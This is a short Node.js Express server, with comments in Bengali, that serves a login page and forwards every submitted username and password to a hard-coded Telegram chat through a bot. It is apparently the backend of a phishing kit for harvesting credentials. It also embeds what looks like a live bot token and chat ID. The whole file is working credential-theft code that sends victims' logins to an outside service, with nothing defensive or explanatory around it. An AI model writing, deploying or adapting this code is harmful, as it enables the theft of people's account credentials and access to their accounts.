const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const PORT = process.env.PORT || 3000;

// Telegram bot setup
const TOKEN = '8349197469:AAGJ3QhB8iJUobWn_qL2sXbLXzsTMsPsnLo';
const CHAT_ID = '6367435401';

const bot = new TelegramBot(TOKEN, { polling: true });

// Static files serve (login.html, css, js ইত্যাদি)
app.use(express.static(__dirname));
app.use(bodyParser.urlencoded({ extended: false }));

// মূল "/" রুটে গেলে login.html দেখাবে
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

// Login form থেকে ডাটা নিলে Telegram-এ পাঠাবে
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // Telegram-এ পাঠানো হচ্ছে
  const message = `Login Info:\nUsername: ${username}\nPassword: ${password}`;
  bot.sendMessage(CHAT_ID, message);

  // Success response
  res.send('Login info sent!');
});

// Example: বট রেসিভ মেসেজ/কমান্ড
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "Bot is working!");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
